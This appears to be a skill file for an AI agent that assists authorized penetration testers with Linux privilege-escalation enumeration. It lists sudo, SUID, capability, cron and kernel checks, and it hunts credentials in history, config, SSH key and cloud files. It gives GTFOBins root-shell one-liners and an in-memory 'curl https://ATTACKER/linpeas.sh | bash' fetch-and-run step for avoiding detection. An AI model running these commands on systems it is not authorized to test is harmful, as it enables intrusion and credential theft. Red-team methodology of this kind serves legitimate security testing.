---
name: linux-discovery
description: >
  Linux local privilege escalation enumeration and attack surface mapping.
keywords:
  - enumerate linux privesc
  - check for privilege escalation
  - run linpeas
  - linux privesc
  - local privesc linux
  - check my privileges on linux
  - escalate on linux
  - what can I escalate
  - post-exploitation linux
  - enumerate this linux box
tools:
  - LinPEAS
  - LinEnum
  - linux-smart-enumeration
  - pspy
  - linux-exploit-suggester
  - SUDO_KILLER
  - unix-privesc-check
opsec: low
---

# Linux Local Privilege Escalation Discovery

You are helping a penetration tester enumerate a Linux system for local privilege
escalation vectors. All testing is under explicit written authorization.

## Engagement Logging

Check for `./engagement/` directory. If absent, proceed without logging.

When an engagement directory exists:
- Print `[linux-discovery] Activated → <target>` to the screen on activation.
- **Evidence** → save significant output to `engagement/evidence/` with
  descriptive filenames (e.g., `sqli-users-dump.txt`, `ssrf-aws-creds.json`).

## Scope Boundary

This skill covers Linux host discovery — enumerating system configuration,
identifying privilege escalation vectors, and reporting findings to the
orchestrator. When you confirm an exploitable vector — **STOP**.

Do not load or execute another skill. Do not continue past your scope boundary.
Instead, return to the orchestrator with:
  - What was found (vulns, credentials, access gained)
  - Detection details (finding type, affected binary/service, evidence)
  - Context for technique execution (hostname, kernel version, current user, etc.)

The orchestrator decides what runs next. Your job is to execute this skill
thoroughly and return clean findings.

**Stay in methodology.** Only use techniques documented in this skill. If you
encounter a scenario not covered here, note it and return — do not improvise
attacks, write custom exploit code, or apply techniques from other domains.
The orchestrator will provide specific guidance or route to a different skill.

## State Management

Call `get_state_summary()` from the state-interim MCP server to read current
engagement state. Use it to:
- Skip re-testing targets, parameters, or vulns already confirmed
- Leverage existing credentials or access for this technique
- Understand what's been tried and failed (check Blocked section)

### Interim Writes

Write actionable findings **immediately** via state-interim so the orchestrator
can react in real time (via event watcher) instead of waiting for your full
return summary. Use these tools as you discover findings:

- `add_credential()` — cleartext creds found in config files, .bash_history, env vars, or databases
- `add_vuln()` — confirmed vulnerabilities a technique agent should exploit (SUID binaries, sudo misconfigs, kernel CVEs)
- `add_pivot()` — additional NICs/subnets discovered via `ip addr`/`ip route`, new hosts from ARP table
- `add_blocked()` — techniques attempted and failed (so orchestrator doesn't re-route)
Your return summary must include:
- New targets/hosts discovered (with ports and services)
- New credentials or tokens found
- Access gained or changed (user, privilege level, method)
- Vulnerabilities confirmed (with status and severity)
- Pivot paths identified (what leads where)
- Blocked items (what failed and why, whether retryable)

## Prerequisites

- Shell access on a Linux system (SSH, reverse shell, webshell)
- Know current user context (`id`)
- Enumeration tools available on target or transferable

## Step 1: System Information

Gather baseline system information for exploit matching and context.

```bash
# Kernel and OS
uname -a
cat /etc/os-release 2>/dev/null || cat /etc/*-release 2>/dev/null
cat /proc/version
uname -r
uname -m  # Architecture (x86_64, aarch64, etc.)

# Hostname and domain
hostname
hostname -f 2>/dev/null
dnsdomainname 2>/dev/null
```

```bash
# Hardware and disk
lscpu
df -h
lsblk 2>/dev/null

# Environment
echo $PATH
echo $LD_LIBRARY_PATH
echo $SHELL
env | grep -iE "pass|key|secret|token|proxy" 2>/dev/null
```

**Key outputs to note:**
- Kernel version (determines kernel exploit eligibility)
- Distribution and version (affects available tools and default configs)
- Architecture (affects binary compatibility for exploits)
- PATH directories (writable ones = hijacking opportunity)
- Environment variables (leaked credentials, writable library paths)

If `env | grep` reveals cleartext credentials (passwords, tokens, API keys),
write them immediately: `add_credential(username=..., secret=..., source="env vars on <host>")`.

## Step 2: User Context and Privileges

```bash
id
groups
cat /etc/passwd | grep -v nologin | grep -v false | grep sh$
awk -F: '($3 == 0) {print $0}' /etc/passwd  # UID 0 accounts
```

**Currently logged-in users:**

```bash
w
who
last -20 2>/dev/null
```

**Group membership (privesc-relevant groups):**

| Group | Escalation Vector |
|-------|-------------------|
| `docker` | Mount host filesystem via container |
| `lxd` / `lxc` | Privileged container escape |
| `disk` | Raw disk read (debugfs) → read /etc/shadow |
| `adm` | Read /var/log/* (credential hunting) |
| `sudo` / `wheel` | Sudo configuration |
| `video` | Framebuffer access (keylogger) |
| `input` | Input device access (keylogger) |
| `staff` | Write to /usr/local (PATH hijack) |

## Step 3: Sudo Configuration

This is the highest-priority check — sudo misconfigurations are the most common Linux
privilege escalation vector.

```bash
sudo -n -l 2>/dev/null  # -n prevents password prompt from hanging the shell
sudo -V 2>/dev/null | head -1  # Sudo version for CVE matching
```

**Sudo version CVEs:**

| Version Range | CVE | Impact |
|---------------|-----|--------|
| < 1.9.5p2 (1.8.2 - 1.9.5p1) | CVE-2021-3156 (Baron Samedit) | Heap overflow → root without sudo access |
| All current | CVE-2019-14287 | `sudo -u#-1` bypasses user restriction |
| 1.9.14 - 1.9.17 < 1.9.17p1 | CVE-2025-32463 | chroot → root |

**MANDATORY: Verify CVE-2021-3156 before marking as confirmed.** Version strings
are necessary but NOT sufficient — distro backports can patch sudo without bumping
the version number. If the version is in the vulnerable range, run this test:

```bash
# Vulnerability verification (does NOT exploit, just confirms)
sudoedit -s '\' $(python3 -c 'print("A"*65536)') 2>&1
# Vulnerable: segfault, memory error, or "malloc(): corrupted..."
# Patched: "usage: sudoedit" error message
```

Only mark CVE-2021-3156 as `[found]` in the engagement state if the test shows a crash or
memory error. A "usage:" response means the build is patched regardless of version.

**What to look for in `sudo -l` output:**

| Pattern | Meaning |
|---------|---------|
| `(root) NOPASSWD: /path/to/binary` | Run as root, no password |
| `env_keep += LD_PRELOAD` | LD_PRELOAD injection with sudo |
| `env_keep += LD_LIBRARY_PATH` | Library path hijack with sudo |
| `SETENV:` before command | Can set env vars (LD_PRELOAD) |
| `(ALL, !root) ALL` | CVE-2019-14287 candidate |
| Binary without full path | PATH hijack |
| Editor/pager/interpreter | GTFOBins escape |

If `sudo -l` returns anything usable → STOP. Report: hostname, current user,
sudo -l output, sudo version. Do not execute privilege escalation commands inline.

**Doas (OpenBSD alternative):**

```bash
cat /etc/doas.conf 2>/dev/null
```

**Polkit / PolicyKit (CVE-2021-3560 and CVE-2021-4034):**

Check polkit version and prerequisites — this is a common privesc vector on
RHEL/CentOS 8 systems where sudo is locked down.

```bash
# Polkit version
rpm -q polkit 2>/dev/null || dpkg -l policykit-1 2>/dev/null || pkaction --version 2>/dev/null

# pkexec SUID status (required for CVE-2021-4034 PwnKit)
ls -la /usr/bin/pkexec 2>/dev/null

# accountsservice (required for CVE-2021-3560)
rpm -q accountsservice 2>/dev/null || dpkg -l accountsservice 2>/dev/null

# dbus-send availability (required for CVE-2021-3560)
which dbus-send 2>/dev/null

# polkitd running
ps aux 2>/dev/null | grep polkit
```

| Condition | CVE |
|-----------|-----|
| polkit < 0.120 + pkexec has SUID bit | CVE-2021-4034 (PwnKit) |
| polkit < 0.117 + accountsservice + dbus-send | CVE-2021-3560 (D-Bus auth bypass) |

If either polkit CVE prerequisite is met → STOP. Report: hostname, current user,
polkit version, pkexec SUID status, accountsservice presence. Do not execute
exploitation commands inline.

**PAM Environment Injection + Polkit Active Session Bypass:**

On SUSE/openSUSE (and potentially other distros), `pam_env.so` may be configured
with `user_readenv=1`, allowing users to inject environment variables via
`~/.pam_environment` that are read *before* `pam_systemd.so` registers the
session with logind. This enables hijacking session properties to gain
`Active=yes` status on an SSH session — unlocking all polkit `allow_active`
policies without authentication.

```bash
# Check PAM config for user_readenv=1
grep -r "user_readenv" /etc/pam.d/ 2>/dev/null

# Check current session properties
loginctl show-session "$XDG_SESSION_ID" 2>/dev/null | grep -E "Active|State|Seat|Type"

# Enumerate polkit actions with allow_active=yes
pkaction --verbose 2>/dev/null | grep -B5 "allow_active.*yes" | grep -E "^org\.|allow_active"
```

**What to look for:**

| Finding | Meaning |
|---------|---------|
| `user_readenv=1` in PAM config | Can inject XDG_SEAT/XDG_VTNR via ~/.pam_environment |
| `Active=no` + `user_readenv=1` | SSH session can be upgraded to Active=yes |
| `allow_active=yes` on udisks2, systemd, or other dangerous actions | Active session can perform privileged operations without auth |

If `user_readenv=1` is found AND polkit actions with `allow_active=yes` exist
→ STOP. Report: hostname, current user, PAM config showing user_readenv, loginctl
session output, list of allow_active polkit actions (especially udisks2 loop-setup,
filesystem resize/check). Do not execute exploitation commands inline.

## Step 4: SUID/SGID and Capabilities

```bash
# SUID binaries
find / -perm -4000 -type f 2>/dev/null

# SGID binaries
find / -perm -2000 -type f 2>/dev/null

# Both SUID and SGID
find / -perm -6000 -type f 2>/dev/null
```

Cross-reference against GTFOBins (https://gtfobins.github.io). Common SUID escalations:

| Binary | Technique |
|--------|-----------|
| `nmap` (old) | `nmap --interactive` → `!sh` |
| `vim` / `vi` | `:!sh` or `:set shell=/bin/sh` then `:shell` |
| `find` | `find . -exec /bin/sh \;` |
| `awk` | `awk 'BEGIN {system("/bin/sh")}'` |
| `perl` | `perl -e 'exec "/bin/sh"'` |
| `python` | `python -c 'import os; os.execl("/bin/sh","sh","-p")'` |
| `bash` | `bash -p` |
| `cp` / `mv` | Overwrite /etc/passwd or /etc/shadow |
| `env` | `env /bin/sh -p` |

**Check for unusual or custom SUID binaries** — anything not in default OS install is
a high-priority target. Use `strings`, `strace`, `ltrace`, or `ldd` to understand behavior.

**Capabilities:**

```bash
getcap -r / 2>/dev/null
```

**Critical capabilities:**

| Capability | Impact |
|------------|--------|
| `cap_setuid+ep` | Direct root: `python -c 'import os; os.setuid(0); os.system("/bin/bash")'` |
| `cap_setgid+ep` | Set GID to shadow/root group |
| `cap_dac_override` | Read/write any file (bypass permissions) |
| `cap_dac_read_search` | Read any file (shocker exploit for containers) |
| `cap_sys_admin` | Mount filesystems, cgroup escape, namespace manipulation |
| `cap_sys_ptrace` | Inject into processes (GDB attach, shellcode injection) |
| `cap_sys_module` | Load kernel modules (reverse shell module) |
| `cap_chown` / `cap_fowner` | Change file ownership/permissions |
| `cap_net_raw` | Raw sockets (sniffing, spoofing) |
| `cap_setfcap` | Set capabilities on other binaries (chain to cap_setuid) |

Any SUID/capability finding → STOP. Report: hostname, current user, SUID binaries
or capabilities found, kernel version. Do not execute privilege
escalation commands inline.

## Step 5: Scheduled Tasks and Process Monitoring

**Cron jobs:**

```bash
crontab -l 2>/dev/null
ls -la /etc/cron* /etc/at* 2>/dev/null
cat /etc/crontab 2>/dev/null
ls -la /etc/cron.d/ 2>/dev/null
cat /etc/cron.d/* 2>/dev/null
ls -la /var/spool/cron/crontabs/ 2>/dev/null
cat /etc/anacrontab 2>/dev/null
```

**What to look for in cron output:**

| Pattern | Escalation |
|---------|-----------|
| Script you can write to | Replace with payload |
| Command without full path | PATH hijack |
| Wildcard `*` in command | Wildcard injection (tar, chown, rsync) |
| Writable cron directory | Add cron job |

**Systemd timers and services:**

```bash
systemctl list-timers --all --no-pager 2>/dev/null
systemctl list-units --type=service --state=running --no-pager 2>/dev/null

# Writable unit files
find /etc/systemd /usr/lib/systemd /lib/systemd -writable -type f 2>/dev/null
```

**Process monitoring (discover hidden cron/scheduled tasks):**

```bash
# pspy — monitor processes without root
./pspy64 -pf -i 1000

# Manual alternative (no tools needed)
for i in $(seq 1 600); do ps -eo user,pid,cmd --no-headers | sort -u >> /tmp/.ps_monitor; sleep 1; done
sort /tmp/.ps_monitor | uniq -c | sort -rn | head -30
```

Watch for root-owned processes that execute writable scripts or use relative paths.

Any finding here → STOP. Report: hostname, current user, specific findings
(writable scripts, wildcard commands, writable unit files), kernel version.
Do not execute exploitation commands inline.

## Step 6: File and Directory Permissions

**World-writable files and directories:**

```bash
# World-writable files (exclude /proc, /sys, /dev)
find / -writable ! -user $(whoami) -type f ! -path "/proc/*" ! -path "/sys/*" ! -path "/dev/*" 2>/dev/null | head -50

# World-writable directories
find / -perm -o+w -type d ! -path "/proc/*" ! -path "/sys/*" ! -path "/dev/*" 2>/dev/null | head -30
```

**Critical file checks:**

```bash
# Writable passwd/shadow/sudoers
ls -la /etc/passwd /etc/shadow /etc/sudoers 2>/dev/null
ls -la /etc/sudoers.d/ 2>/dev/null

# Check for hashes in /etc/passwd (not using shadow)
grep -v '^[^:]*:[x*!]' /etc/passwd 2>/dev/null

# SSH keys
find / -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" 2>/dev/null
find / -name "authorized_keys" -writable 2>/dev/null

# Profile scripts (execute on login — backdoor opportunity)
ls -la /etc/profile /etc/profile.d/ /etc/bash.bashrc 2>/dev/null

# NFS shares (no_root_squash = SUID injection)
cat /etc/exports 2>/dev/null | grep no_root_squash
showmount -e localhost 2>/dev/null
```

**Library hijacking paths:**

```bash
# Shared library configuration
cat /etc/ld.so.conf /etc/ld.so.conf.d/* 2>/dev/null

# RPATH/RUNPATH in SUID binaries (writable = hijack)
find / -perm -4000 -type f 2>/dev/null | while read f; do
  readelf -d "$f" 2>/dev/null | grep -E "RPATH|RUNPATH" && echo "  → $f"
done

# Missing shared objects in SUID binaries
find / -perm -4000 -type f 2>/dev/null | while read f; do
  ldd "$f" 2>/dev/null | grep "not found" && echo "  → $f"
done

# Python library paths
python3 -c "import sys; print('\n'.join(sys.path))" 2>/dev/null
```

**Writable PATH directories:**

```bash
echo $PATH | tr ':' '\n' | while read dir; do
  [ -w "$dir" ] && echo "WRITABLE: $dir"
done
```

Any finding here → STOP. Report: hostname, current user, specific findings
(writable files, group memberships, library paths), kernel version. Do not
execute exploitation commands inline.

## Step 7: Credential Hunting (Quick Scan)

Fast checks for stored credentials before deep analysis.

```bash
# History files
cat ~/.bash_history ~/.zsh_history ~/.mysql_history ~/.python_history 2>/dev/null | grep -iE "pass|secret|key|token|mysql.*-p|ssh.*-i" | head -20

# Common credential files
find / -name "*.conf" -o -name "*.config" -o -name "*.ini" -o -name "*.env" 2>/dev/null | xargs grep -liE "pass|secret|key|token" 2>/dev/null | head -20

# Database connection strings
grep -rliE "mysql|postgres|mongo|redis" /etc/ /opt/ /var/www/ 2>/dev/null | head -10

# Backup files (often contain plaintext creds)
find / -name "*.bak" -o -name "*.backup" -o -name "*.old" -o -name "*.orig" 2>/dev/null | head -20

# Git repositories (may contain credentials in history)
find / -name ".git" -type d 2>/dev/null
```

```bash
# Cloud credentials
ls -la ~/.aws/credentials ~/.azure/ ~/.config/gcloud/ 2>/dev/null

# Docker config (may contain registry creds)
cat ~/.docker/config.json 2>/dev/null

# SSH agent
ssh-add -l 2>/dev/null
```

**STOP — write interim findings NOW.** Before continuing to Step 8, check
every result above. Any cleartext credentials found in history files, config
files, database connection strings, or cloud credential files — call
`add_credential()` NOW, one call per credential. Any password hashes extracted
from databases — call `add_credential(secret_type="other")` NOW. Any confirmed
privesc-relevant vulnerability (writable root-owned scripts, exploitable
services) — call `add_vuln()` NOW. Do not batch these at the end of
enumeration. The orchestrator's event watcher reacts to interim writes in real
time — a credential written now can trigger parallel cracking or spray while
you continue enumerating.

## Step 8: Network and Services

```bash
# Listening services
ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null

# Internal-only services (127.0.0.1 listeners)
ss -tlnp 2>/dev/null | grep "127.0.0.1\|::1"

# All connections
ss -anp 2>/dev/null | head -30

# Routing table
ip route 2>/dev/null || route -n 2>/dev/null

# ARP table (discover other hosts)
ip neigh 2>/dev/null || arp -a 2>/dev/null

# Firewall rules
iptables -L -n 2>/dev/null
```

**Unix sockets:**

```bash
# Writable sockets
find / -type s 2>/dev/null | while read s; do
  [ -w "$s" ] && echo "WRITABLE: $s"
done

# Docker socket (container escape)
ls -la /var/run/docker.sock 2>/dev/null
```

Writable Docker socket → report for container escape / file path abuse.
Internal services on loopback → investigate for exploitation.

**STOP — write interim findings NOW.** Before continuing to Step 9:
- Additional NIC found via `ip addr` → call `add_pivot()` NOW
- New hosts from `ip neigh`/ARP table → call `add_pivot()` NOW
- Exploitable internal-only services on loopback → call `add_vuln()` NOW
- Root-owned services on localhost (check `ss -tlnp` output for root
  processes on 127.0.0.1) → call `add_vuln(title="Root <service> on
  <host>:127.0.0.1:<port>", vuln_type="internal-service", severity="high")`

## Step 9: Security Controls Detection

```bash
# SELinux
sestatus 2>/dev/null || getenforce 2>/dev/null

# AppArmor
aa-status 2>/dev/null || apparmor_status 2>/dev/null

# ASLR
cat /proc/sys/kernel/randomize_va_space  # 0=off, 1=conservative, 2=full

# Ptrace scope (blocks memory injection, sudo_inject)
cat /proc/sys/kernel/yama/ptrace_scope  # 0=unrestricted, 3=disabled

# Seccomp
grep Seccomp /proc/self/status

# Container detection
ls /.dockerenv 2>/dev/null && echo "IN DOCKER"
cat /proc/1/cgroup 2>/dev/null | grep -qE "docker|lxc|kubepods" && echo "IN CONTAINER"

# Docker Desktop / WSL2 detection
# If kernel contains "microsoft-standard-WSL2", this is Docker Desktop on
# Windows/macOS — flag for container-escapes skill (Docker Desktop-specific
# escape vectors exist even without socket, caps, or privileged mode)
uname -r | grep -q "microsoft-standard-WSL2" && echo "DOCKER DESKTOP (WSL2)"
```

**Kernel protections:**

```bash
# Check if exploit mitigations are active
cat /proc/sys/kernel/kptr_restrict      # 0=exposed, 1=hidden for non-root
cat /proc/sys/kernel/dmesg_restrict     # 1=restrict dmesg to root
cat /proc/sys/kernel/perf_event_paranoid # Higher = more restricted
```

**Compiler availability (needed for kernel exploits):**

```bash
which gcc g++ cc make 2>/dev/null
gcc --version 2>/dev/null | head -1
```

## Step 10: Kernel Exploit Assessment

```bash
# Kernel version
uname -r
cat /proc/version

# Quick CVE check
# DirtyPipe: Linux 5.8 <= kernel < 5.16.11, 5.15.25, 5.10.102
# DirtyCow: Linux <= 3.19.0-73.8
# GameOver(lay): Ubuntu kernels with OverlayFS (CVE-2023-0386)
```

**Automated exploit suggestion (run on attacker machine with kernel info):**

```bash
# linux-exploit-suggester.sh (mzet-)
./linux-exploit-suggester.sh --uname "$(uname -r)"

# linux-exploit-suggester-2 (jondonas)
perl linux-exploit-suggester-2.pl -k $(uname -r)
```

Match kernel version against known exploits → STOP. Report: hostname, kernel
version, distribution, architecture, compiler availability, exploit-suggester
output. Do not execute kernel exploits inline.

## Step 11: Automated Enumeration Tools

When manual checks are insufficient, run comprehensive tools.

**LinPEAS (comprehensive — highest coverage):**

```bash
# Standard run
./linpeas.sh | tee linpeas_output.txt

# Fast/stealth mode (less I/O, fewer indicators)
./linpeas.sh -s

# All checks including deeper analysis
./linpeas.sh -a

# Password brute-force against sudo
./linpeas.sh -P
```

**OPSEC note:** LinPEAS creates significant file I/O and process activity. In
OPSEC-sensitive engagements, prefer `-s` (stealth) mode or manual checks from
Steps 1-10. Consider piping directly from memory:
```bash
curl -sL https://ATTACKER/linpeas.sh | bash
```

**LinEnum:**

```bash
./LinEnum.sh -s -k password -r report -e /tmp/ -t
```

**linux-smart-enumeration (lse.sh):**

```bash
./lse.sh -l1    # Interesting findings only
./lse.sh -l2    # Full enumeration
```

**unix-privesc-check:**

```bash
./unix-privesc-check standard
./unix-privesc-check detailed
```

**SUDO_KILLER:**

```bash
./SUDO_KILLERv2.sh
```

**pspy (process monitoring — run first, leave running during enumeration):**

```bash
./pspy64 -pf -i 1000
```

## Step 12: Return to Orchestrator

STOP and return to the orchestrator with all findings. Present findings ranked
by reliability and OPSEC:

1. Sudo NOPASSWD / SUID (near-certain, low OPSEC)
2. Capabilities with cap_setuid (direct root, low OPSEC)
3. Writable cron/service scripts (reliable, wait for execution)
4. File permission abuse (reliable if writable)
5. Kernel exploits (last resort — may crash system)

For each finding, pass along: hostname, kernel version, distribution, current
user, specific findings (sudo entries, SUID binaries, capabilities, writable
scripts, kernel CVEs, credentials found).

## Troubleshooting

### LinPEAS blocked by security controls
Use manual checks from Steps 1-10 — they use only built-in commands. Or pipe
LinPEAS from memory: `curl -sL URL | sh` to avoid writing to disk.

### No tools transferable
Manual enumeration using Steps 1-10 covers all major vectors using only built-in
commands. Focus on `sudo -l` (Step 3), SUID enumeration (Step 4), and cron review
(Step 5) as highest-value manual checks.

### Restricted shell (rbash, rksh)
Try `bash` or `sh` to escape. If SUID bash exists: `bash -p`. Other breakouts:
`vi` → `:set shell=/bin/bash` → `:shell`, or `awk 'BEGIN {system("/bin/bash")}'`.

### In a container
Check `/.dockerenv` or cgroup membership. Container-specific privesc vectors
(cap_sys_admin + mount, Docker socket, privileged mode) should be reported
for container escape techniques.

Also check the kernel string: `uname -r | grep -q "microsoft-standard-WSL2"`.
If found, flag as Docker Desktop environment — this unlocks Docker Desktop-specific
escape vectors (internal management API) that are NOT detectable via standard
container enumeration (no socket, no caps, no mounts needed). Report this
as a finding even when all standard container escape checks come back negative.
